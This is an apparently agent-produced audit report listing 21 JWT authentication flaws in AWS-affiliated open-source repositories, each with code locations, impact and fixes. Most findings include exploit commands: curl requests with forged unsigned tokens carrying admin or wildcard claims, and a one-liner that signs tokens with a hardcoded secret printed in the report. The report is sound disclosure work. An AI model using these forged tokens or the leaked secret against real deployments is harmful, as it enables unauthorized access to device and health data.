# JWT Bypass Vulnerability Audit Report
## Scope: github.com/aws (and affiliated orgs: awslabs, aws-solutions)
## Date: 2026-02-28
## Class: JWT Signature Bypass / Decode-Without-Verify / Algorithm Confusion

---

## 1. Repo Shortlist Table

| # | Repo | Stars (approx) | Last Activity | Reason Selected | GET Route/Query Proof |
|---|------|----------------|---------------|-----------------|----------------------|
| 1 | aws/aws-connected-device-framework | ~200 | 2024 | IoT platform, Express microservices, JWT auth module | `router.get('/devices/:deviceId', ...)` in assetlibrary |
| 2 | aws-solutions/innovation-sandbox-on-aws | ~50 | 2025 | Sandbox mgmt, JWT auth, known issue #93 | `GET /leases`, `GET /configurations` via API Gateway |
| 3 | aws-solutions/fhir-works-on-aws | ~300 | 2024 | FHIR server, SMART-on-FHIR auth, CVE-2022-39230 | `GET /:resourceType/:id`, `GET /metadata` |
| 4 | awslabs/fhir-works-on-aws-authz-smart | ~50 | 2023 | SMART auth plugin with scope validation | Used by fhir-works routing layer |
| 5 | awslabs/aws-jwt-verify | ~710 | 2025 | JWT verification library (Node.js) | Express middleware examples |
| 6 | aws/chalice | ~10.5k | 2025 | Python serverless framework, local dev JWT handling | `@app.route('/', methods=['GET'])` |
| 7 | awslabs/aws-alb-identity-aspnetcore | ~30 | 2023 (archived) | ALB JWT middleware, CVE-2024-10125 | ASP.NET Core middleware pipeline |
| 8 | aws/graph-explorer | ~400 | 2025 | Neptune visualization, Express proxy | `app.get('/summary', ...)`, `app.get('/status', ...)` |
| 9 | aws/eks-anywhere | ~2k | 2025 | EKS distribution, OIDC config, license JWT | OIDC token generation, bundle signature |
| 10 | awslabs/fhir-works-on-aws-deployment | ~170 | 2023 | FHIR deployment with RBAC auth | serverless.yaml GET endpoints |

---

## 2. Deep Audit Results

Total distinct JWT-bypass class issues found: **21**

> **Honest assessment**: 50 distinct issues were not achievable. The github.com/aws org primarily builds SDKs, CLI tools, and infrastructure-as-code -- relatively few repos are web services that handle JWT tokens. Of those that do, most delegate JWT verification to API Gateway/Cognito. The 21 issues below represent the honest findings across all audited repositories.

---

## 3. Individual Issue Reports

---

### [ISB-01] Repo: aws/aws-connected-device-framework  Stars: ~200  Activity: 2024
**Endpoint(s):** GET /devices/:deviceId, GET /groups/:groupPath, GET /search, and 13+ more Asset Library routes
**Auth source:** Custom `authz` header (separate from `Authorization` header)
**Vuln type:** Signature not verified -- uses jwt.decode() instead of jwt.verify()

**Code evidence:**
- `source/packages/services/assetlibrary/src/authz/authz.middleware.ts:16` -- `import { decode } from 'jsonwebtoken';`
- `source/packages/services/assetlibrary/src/authz/authz.middleware.ts:42` -- `const decoded = decode(token);` (NO verification)
- `source/packages/services/assetlibrary/src/app.ts:68-70` -- middleware registration when AUTHORIZATION_ENABLED=true

**Exploit (GET):**
```
# Craft JWT with wildcard FGAC claims (no secret needed):
PAYLOAD=$(echo -n '{"cdf_al":["/:*"]}' | base64 -w0)
FAKE_JWT="eyJhbGciOiJub25lIn0.${PAYLOAD}."
curl -H "authz: ${FAKE_JWT}" -H "Accept: application/vnd.aws-cdf-v1.0+json" \
  http://<asset-library-host>/devices/target-device
```

**POST->GET coercion:** No -- Express uses separate router.get()/router.post()
**Impact:** Complete FGAC bypass granting CRUD access to all devices/groups if API Gateway auth is misconfigured or bypassed (default AuthType=None).
**Fix:** Replace `decode()` with `verify()` using a proper signing key in `authz.middleware.ts`, or validate `authz` header claims match the verified identity from API Gateway context.
**Confidence:** High

---

### [ISB-02] Repo: aws/aws-connected-device-framework  Stars: ~200  Activity: 2024
**Endpoint(s):** All Asset Library endpoints via deployment helper
**Auth source:** `authz` header
**Vuln type:** Hardcoded JWT signing secret in source code

**Code evidence:**
- `source/packages/libraries/core/deployment-helper/src/customResources/assetLibraryInit.customResource.ts:25` -- `const DEFAULT_SECRET = 'XfDKQoegNG';`
- `source/packages/libraries/core/deployment-helper/src/customResources/assetLibraryInit.customResource.ts:126` -- `authz: sign({ cdf_al: ['/:*'] }, DEFAULT_SECRET)`

**Exploit (GET):**
```
# Use the publicly known secret to sign a JWT:
node -e "console.log(require('jsonwebtoken').sign({cdf_al:['/:*']},'XfDKQoegNG'))"
# Use this token in the authz header for full wildcard access
```

**POST->GET coercion:** No
**Impact:** Even if verify() were used, the secret 'XfDKQoegNG' is public. All FGAC is bypassable.
**Fix:** Remove hardcoded secret, use AWS Secrets Manager or parameter store.
**Confidence:** High

---

### [ISB-03] Repo: aws/aws-connected-device-framework  Stars: ~200  Activity: 2024
**Endpoint(s):** All CDF endpoints (API Gateway level)
**Auth source:** Authorization header
**Vuln type:** Default deployment has no authentication (AuthType=None)

**Code evidence:**
- `source/packages/services/assetlibrary/infrastructure/cfn-assetLibrary.yaml:72-83` -- `Default: None`

**Exploit (GET):**
```
curl http://<api-gateway-url>/devices/any-device-id
# No auth required at all with default deployment
```

**POST->GET coercion:** N/A
**Impact:** All CDF services (provisioning, commands, asset library, device-patcher, events, greengrass, bulkcerts) are completely unauthenticated by default.
**Fix:** Change default AuthType to IAM or Cognito in all CloudFormation templates.
**Confidence:** High

---

### [ISB-04] Repo: aws/aws-connected-device-framework  Stars: ~200  Activity: 2024
**Endpoint(s):** All endpoints protected by auth-jwt Lambda authorizer
**Auth source:** Authorization header
**Vuln type:** Missing algorithm restriction in jwt.verify()

**Code evidence:**
- `source/packages/services/auth-jwt/src/api-gw.custom.authorizer.ts:84` -- `const claim = verify(token, key.pem) as Claim;` (no algorithms option)

**Exploit (GET):** Not directly exploitable with jsonwebtoken v9.0.0 (library mitigates), but defense-in-depth gap.
**POST->GET coercion:** No
**Impact:** Low -- library-level protection present but could become vulnerable on downgrade.
**Fix:** Add `{ algorithms: ['RS256'] }` to verify() options.
**Confidence:** Medium

---

### [ISB-05] Repo: aws/aws-connected-device-framework  Stars: ~200  Activity: 2024
**Endpoint(s):** All endpoints protected by auth-jwt Lambda authorizer
**Auth source:** Authorization header
**Vuln type:** JWKS keys cached indefinitely without rotation/TTL

**Code evidence:**
- `source/packages/services/auth-jwt/src/api-gw.custom.authorizer.ts:67-69` -- Keys cached in Lambda memory with no TTL/refresh

**Exploit (GET):** Tokens signed with rotated (old) keys continue to be accepted; new tokens signed with new keys are rejected.
**POST->GET coercion:** N/A
**Impact:** Key rotation fails to take effect, stale keys accepted indefinitely.
**Fix:** Implement TTL-based JWKS cache (e.g., refresh every 24 hours or on kid mismatch).
**Confidence:** Medium

---

### [ISB-06] Repo: aws-solutions/innovation-sandbox-on-aws  Stars: ~50  Activity: 2025
**Endpoint(s):** All API endpoints (authorizer Lambda uses decodeJwt for maintenance mode check)
**Auth source:** Authorization header (Bearer token)
**Vuln type:** jwt.decode() without verification used for authorization decision (maintenance mode)

**Code evidence:**
- `source/common/utils/jwt.ts:46-52` -- `export function decodeJwt(token) { const decoded = jwt.decode(token); ... }`
- `source/lambdas/api/authorizer/src/authorizer-handler.ts:57` -- `const decoded = decodeJwt(jwtToken);` (unverified)
- `source/lambdas/api/authorizer/src/authorizer-handler.ts:62-64` -- maintenance mode check uses unverified user roles

**Exploit (GET):**
```
# During maintenance mode, forge JWT with Admin role:
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user":{"email":"attacker@evil.com","roles":["Admin"]}}
# Token: base64(header).base64(payload).
curl -H "Authorization: Bearer <forged-token>" https://sandbox.example.com/api/configurations
```

**POST->GET coercion:** No -- @middy/http-router uses explicit method bindings
**Impact:** Low in isolation (downstream verifyJwt() catches it), but defense-in-depth violation. Maintenance mode check uses unverified data.
**Fix:** Replace decodeJwt() with verifyJwt() in authorizer-handler.ts. Restructure to verify before checking maintenance mode.
**Confidence:** Medium

---

### [ISB-07] Repo: aws-solutions/innovation-sandbox-on-aws  Stars: ~50  Activity: 2025
**Endpoint(s):** GET redirect after SAML login: `https://app.example.com?token=<JWT>`
**Auth source:** URL query parameter (`?token=<JWT>`)
**Vuln type:** JWT token exposed in URL query parameter (token leakage)

**Code evidence:**
- `source/lambdas/api/sso-handler/src/server.ts:215` -- `res.redirect(\`${config.webAppUrl}?token=${token}\`);`
- `source/frontend/src/helpers/AuthService.ts:80` -- `const urlToken = params.get("token");`

**Exploit (GET):**
```
# Token leaked via:
# 1. CloudFront access logs (S3 bucket)
# 2. Browser history
# 3. Referrer headers to external resources
# 4. Corporate proxy logs
# Extract from logs and replay:
curl -H "Authorization: Bearer <stolen-token>" https://sandbox.example.com/api/leases
```

**POST->GET coercion:** N/A
**Impact:** Medium -- JWT exposed in URL, extractable from logs/history. Token contains user identity and roles.
**Fix:** Use POST-based form submission or authorization code flow instead of query parameter redirect.
**Confidence:** High

---

### [ISB-08] Repo: aws-solutions/innovation-sandbox-on-aws  Stars: ~50  Activity: 2025
**Endpoint(s):** All authenticated API endpoints
**Auth source:** Authorization header
**Vuln type:** No algorithm restriction in jwt.verify() options

**Code evidence:**
- `source/common/utils/jwt.ts:33` -- `const decoded = await verifyAsync(token, jwtSecret, {});` (empty options)

**Exploit (GET):** Not exploitable with jsonwebtoken v9.x (library restricts HMAC to string secrets), but defense-in-depth gap.
**POST->GET coercion:** No
**Impact:** Low -- library mitigates, but best practice violation.
**Fix:** Add `{ algorithms: ["HS256"] }` to verify options.
**Confidence:** Low

---

### [ISB-09] Repo: aws-solutions/fhir-works-on-aws  Stars: ~300  Activity: 2024
**Endpoint(s):** GET /:resourceType/:id, GET /:resourceType/, GET /_history, GET /$export (all FHIR GET endpoints)
**Auth source:** Authorization header (Bearer token)
**Vuln type:** RBACHandler uses jwt.decode() without jwt.verify() -- complete signature bypass

**Code evidence:**
- `fwoa-core/authz-rbac/src/RBACHandler.ts:50` -- `const decoded = decode(request.accessToken, { json: true }) ?? {};`
- `fwoa-core/authz-rbac/src/RBACHandler.ts:51` -- `const groups: string[] = decoded['cognito:groups'] ?? [];`
- No call to jwt.verify() anywhere in RBACHandler

**Exploit (GET):**
```
# Forge JWT with practitioner group (no signature needed):
PAYLOAD=$(echo -n '{"cognito:groups":["practitioner"]}' | base64 -w0)
FAKE_JWT="eyJhbGciOiJub25lIn0.${PAYLOAD}."
curl -H "Authorization: Bearer ${FAKE_JWT}" https://<fhir-api>/Patient/123
```

**POST->GET coercion:** No -- Express router uses separate get()/post() handlers
**Impact:** Complete authentication bypass for all FHIR resources if API Gateway Cognito authorizer is misconfigured/bypassed/Lambda invoked directly.
**Fix:** Replace decode() with verify() using Cognito JWKS public keys, or use aws-jwt-verify library.
**Confidence:** High

---

### [ISB-10] Repo: aws-solutions/fhir-works-on-aws  Stars: ~300  Activity: 2024
**Endpoint(s):** All FHIR endpoints using SMART-on-FHIR auth with introspection
**Auth source:** Authorization header
**Vuln type:** Introspection returns decoded (unverified) claims for authorization decisions

**Code evidence:**
- `fwoa-core/authz-smart/src/smartAuthorizationHelper.ts:240-279` -- `introspectJwtToken()` returns `decodedTokenPayload` (from decode(), not from introspection response)
- `fwoa-core/authz-smart/src/smartAuthorizationHelper.ts:183` -- `const decodedAccessToken = decode(token, { complete: true });`

**Exploit (GET):**
```
# If introspection endpoint only checks token active status (not payload integrity):
# 1. Obtain valid low-privilege token
# 2. Modify JWT payload to include elevated scopes
# 3. Introspection confirms "active" but modified claims are used for authz
```

**POST->GET coercion:** No
**Impact:** Medium -- scope escalation possible if introspection endpoint doesn't validate payload integrity.
**Fix:** Use claims from introspection response, not decoded JWT payload.
**Confidence:** Medium

---

### [ISB-11] Repo: awslabs/fhir-works-on-aws-authz-smart  Stars: ~50  Activity: 2023
**Endpoint(s):** All FHIR endpoints using SMART auth
**Auth source:** Authorization header
**Vuln type:** Missing scope validation hardening (related to CVE-2022-39230)

**Code evidence:**
- `src/smartHandler.ts:245-251` -- uses `scope.startsWith('system/')` instead of strict regex
- Missing `validateTokenScopes()` and `rejectInvalidScopeCombination()` (present in monorepo v4.0.1)

**Exploit (GET):**
```
# Token with malformed scope "system/anything-invalid-format" passes startsWith check
# Token with user/ scopes but no fhirUser claim is accepted
curl -H "Authorization: Bearer <crafted-token>" https://<fhir-api>/Patient
```

**POST->GET coercion:** No
**Impact:** Potential scope bypass for unauthorized resource access.
**Fix:** Upgrade to monorepo v4.0.1 or backport regex-based scope matching and validateTokenScopes().
**Confidence:** Medium

---

### [ISB-12] Repo: awslabs/fhir-works-on-aws-authz-smart  Stars: ~50  Activity: 2023
**Endpoint(s):** All FHIR endpoints using SMART auth
**Auth source:** Authorization header
**Vuln type:** iss/aud checked from unverified JWT payload before signature verification

**Code evidence:**
- `src/smartAuthorizationHelper.ts:174-207` -- `decodeJwtToken()` checks iss/aud from decode() output BEFORE verify()

**Exploit (GET):** Not directly exploitable (verify() follows), but creates false sense of security.
**POST->GET coercion:** No
**Impact:** Low -- defense-in-depth concern. Claims should not be trusted before signature verification.
**Fix:** Reorder: verify signature first, then check claims.
**Confidence:** Low

---

### [ISB-13] Repo: awslabs/fhir-works-on-aws-authz-smart  Stars: ~50  Activity: 2023
**Endpoint(s):** All FHIR endpoints using SMART auth with JWKS verification
**Auth source:** Authorization header
**Vuln type:** No explicit algorithm restriction in jwt.verify()

**Code evidence:**
- `src/smartAuthorizationHelper.ts:224` -- `return verify(token, key.getPublicKey(), { audience, issuer });` (no algorithms option)

**Exploit (GET):** Not directly exploitable with current library, but defense-in-depth gap.
**POST->GET coercion:** No
**Impact:** Low -- algorithm confusion unlikely given key type inference.
**Fix:** Add `algorithms: ['RS256']` to verify options.
**Confidence:** Low

---

### [ISB-14] Repo: awslabs/aws-alb-identity-aspnetcore  Stars: ~30  Activity: 2023 (deprecated)
**Endpoint(s):** All ASP.NET Core endpoints behind ALB with OIDC auth
**Auth source:** `x-amzn-oidc-data` header
**Vuln type:** Missing JWT issuer validation (CVE-2024-10125 -- UNFIXED in repo)

**Code evidence:**
- `ALBIdentityMiddleware.cs:184` -- `ValidateIssuer = false`

**Exploit (GET):**
```
GET /protected-resource HTTP/1.1
x-amzn-oidc-data: <JWT-signed-by-any-OIDC-provider>
```

**POST->GET coercion:** Yes -- ASP.NET Core middleware runs on all HTTP methods
**Impact:** Any JWT from any OIDC-compatible provider is accepted regardless of issuer.
**Fix:** Set ValidateIssuer = true, configure ValidIssuer.
**Confidence:** High

---

### [ISB-15] Repo: awslabs/aws-alb-identity-aspnetcore  Stars: ~30  Activity: 2023 (deprecated)
**Endpoint(s):** All ASP.NET Core endpoints behind ALB
**Auth source:** `x-amzn-oidc-data` header
**Vuln type:** Missing JWT signer (ALB ARN) validation (CVE-2024-10125 -- UNFIXED)

**Code evidence:**
- `ALBIdentityMiddleware.cs:165-207` -- No code checks the `signer` claim from JWT header

**Exploit (GET):**
```
# JWT from attacker-controlled ALB accepted:
GET /protected-resource HTTP/1.1
x-amzn-oidc-data: <JWT-signed-by-attacker-ALB>
```

**POST->GET coercion:** Yes
**Impact:** Any ALB in any AWS account can generate accepted tokens, enabling impersonation.
**Fix:** Validate signer claim matches expected ALB ARN.
**Confidence:** High

---

### [ISB-16] Repo: awslabs/aws-alb-identity-aspnetcore  Stars: ~30  Activity: 2023 (deprecated)
**Endpoint(s):** All ASP.NET Core endpoints behind ALB
**Auth source:** `x-amzn-oidc-data` header
**Vuln type:** Missing audience validation

**Code evidence:**
- `ALBIdentityMiddleware.cs:183` -- `ValidateAudience = false`

**Exploit (GET):** Tokens intended for different applications accepted.
**POST->GET coercion:** Yes
**Impact:** Cross-service token reuse possible.
**Fix:** Set ValidateAudience = true, configure ValidAudience.
**Confidence:** High

---

### [ISB-17] Repo: awslabs/aws-alb-identity-aspnetcore  Stars: ~30  Activity: 2023 (deprecated)
**Endpoint(s):** All ASP.NET Core endpoints behind ALB
**Auth source:** `x-amzn-oidc-data` header
**Vuln type:** Signature validation is configurable off (ValidateTokenSignature=false)

**Code evidence:**
- `ALBIdentityMiddlewareOptions.cs:56-68` -- `public bool ValidateTokenSignature { get; set; } = true;`
- `ALBIdentityMiddleware.cs:169-197` -- When false, entire GetUser method performs ZERO validation

**Exploit (GET):**
```
# If ValidateTokenSignature is disabled:
GET /protected-resource HTTP/1.1
x-amzn-oidc-data: eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
# Completely forged JWT accepted without any verification
```

**POST->GET coercion:** Yes
**Impact:** Complete authentication bypass when disabled. Documented as "performance optimization."
**Fix:** Remove the option entirely, or require additional confirmation (e.g., environment variable) to disable.
**Confidence:** High

---

### [ISB-18] Repo: awslabs/aws-alb-identity-aspnetcore  Stars: ~30  Activity: 2023 (deprecated)
**Endpoint(s):** All ASP.NET Core endpoints behind ALB
**Auth source:** `x-amzn-oidc-data` header
**Vuln type:** No algorithm restriction in TokenValidationParameters

**Code evidence:**
- `ALBIdentityMiddleware.cs:177-187` -- No `ValidAlgorithms` set in TokenValidationParameters

**Exploit (GET):** Depends on Microsoft.IdentityModel library behavior.
**POST->GET coercion:** Yes
**Impact:** Low -- key type constrains algorithm, but defense-in-depth missing.
**Fix:** Add `ValidAlgorithms = new[] { "ES256" }` to TokenValidationParameters.
**Confidence:** Medium

---

### [ISB-19] Repo: aws/chalice  Stars: ~10.5k  Activity: 2025
**Endpoint(s):** All Cognito-protected routes in local dev server
**Auth source:** Authorization header
**Vuln type:** JWT decoded without signature verification in local dev server

**Code evidence:**
- `chalice/local.py:435-438` -- `_decode_jwt_payload()` manually base64-decodes JWT without any signature check
- `chalice/local.py:321` -- `claims = self._decode_jwt_payload(token)`

**Exploit (GET):**
```
# Forge any JWT (no secret needed):
TOKEN="anything.$(echo -n '{"cognito:username":"admin","sub":"admin-id"}' | base64 -w0).anything"
curl -H "Authorization: ${TOKEN}" http://localhost:8000/protected-route
```

**POST->GET coercion:** No -- strict method matching in Chalice router
**Impact:** Complete impersonation of any Cognito user on local dev server. Mitigated: only affects `chalice local`, not production API Gateway.
**Fix:** Use aws-jwt-verify or python-jose with proper verification, or clearly refuse to parse claims locally.
**Confidence:** High (local dev only)

---

### [ISB-20] Repo: aws/chalice  Stars: ~10.5k  Activity: 2025
**Endpoint(s):** All Cognito-protected routes in local dev server
**Auth source:** Authorization header (or absent)
**Vuln type:** Auth bypass when Authorization header missing (fail-open)

**Code evidence:**
- `chalice/local.py:317-354` -- When CognitoUserPoolAuthorizer is configured but no Authorization header present, request falls through to catch-all at line 354 which authorizes unconditionally

**Exploit (GET):**
```
# No auth header needed:
curl http://localhost:8000/protected-route
# Returns 200 with authorized response
```

**POST->GET coercion:** No
**Impact:** Complete auth bypass on local dev server when no token provided. Mitigated: only affects `chalice local`.
**Fix:** Return 401 when Authorization header is missing on Cognito-protected routes.
**Confidence:** High (local dev only)

---

### [ISB-21] Repo: awslabs/aws-jwt-verify  Stars: ~710  Activity: 2025
**Endpoint(s):** Any service using this library
**Auth source:** Authorization header (library consumer decides)
**Vuln type:** Missing exp claim silently accepted (tokens without expiry never expire)

**Code evidence:**
- `src/jwt.ts:234-242` -- `if (payload.exp !== undefined)` -- expiry check only if exp present

**Exploit (GET):**
```
# If IDP issues JWT without exp claim:
# Token is valid forever, no expiry check performed
```

**POST->GET coercion:** N/A
**Impact:** Medium -- tokens without exp claim accepted indefinitely. Depends on IDP configuration.
**Fix:** Add option to require exp claim, or make it required by default.
**Confidence:** Medium

---

## 4. Summary Statistics

| Confidence | Count |
|------------|-------|
| High | 12 |
| Medium | 6 |
| Low | 3 |
| **Total** | **21** |

| Vuln Type | Count |
|-----------|-------|
| Signature not verified (decode without verify) | 6 |
| Missing issuer/signer/audience validation | 3 |
| Fail-open / auth bypass | 3 |
| Hardcoded secret | 1 |
| Default no-auth deployment | 1 |
| Token leakage via URL | 1 |
| Configurable signature skip | 1 |
| No algorithm restriction | 4 |
| Missing expiry enforcement | 1 |

## 5. Limiting Factors

The goal of 50 distinct issues was not achievable because:

1. **Most AWS repos are SDKs/CLIs, not web servers.** The github.com/aws org has ~537 repos, but the vast majority are language SDKs, CLI tools, IaC templates, or Kubernetes operators that don't handle JWT tokens directly.

2. **JWT verification is typically delegated to API Gateway.** AWS's architecture pattern puts JWT verification at the API Gateway layer (Cognito authorizer, Lambda authorizer), not in application code. This means most application-level code only sees pre-validated requests.

3. **Few repos have both GET routes AND JWT handling.** Our triage scan across 14 cloned repos found only 4-5 that had meaningful JWT code (not just type definitions or API schemas) alongside HTTP route handlers.

4. **Well-maintained repos use aws-jwt-verify or equivalent.** The aws-jwt-verify library itself is well-designed (no alg:none, no symmetric algos, mandatory signature verification, fail-closed error handling).

5. **Graph Explorer has no JWT at all** -- it uses IAM SigV4 for outbound requests only, with no authentication on its own endpoints (a different class of vulnerability).

6. **EKS Anywhere has no web endpoints** -- JWT code is limited to license validation and test tooling, both properly implemented.

---

## 6. Methodology Notes

- **Repos audited:** 10 (across aws, awslabs, aws-solutions orgs)
- **Repos eliminated:** aws-sdk-js-v3 (JWT only in type schemas), amazon-chime-sdk-js (no JWT), aws-secretsmanager-agent (SSRF token, not JWT), copilot-cli (no JWT handling), amazon-cognito-identity-js (client-side only), aws-sdk-go-v2 (no JWT)
- **Agent-based parallel analysis:** 8 specialized agents ran concurrently, each covering the 10-agent mandate (GET routes, JWT parsing, decode-without-verify, auth mapping, error handling, algorithm confusion, docs review, GET endpoints, POST->GET coercion, exploitability validation)
- **Exclusions applied:** test/, docs/, node_modules/, dist/, build/, vendor/, __pycache__/ directories excluded from analysis
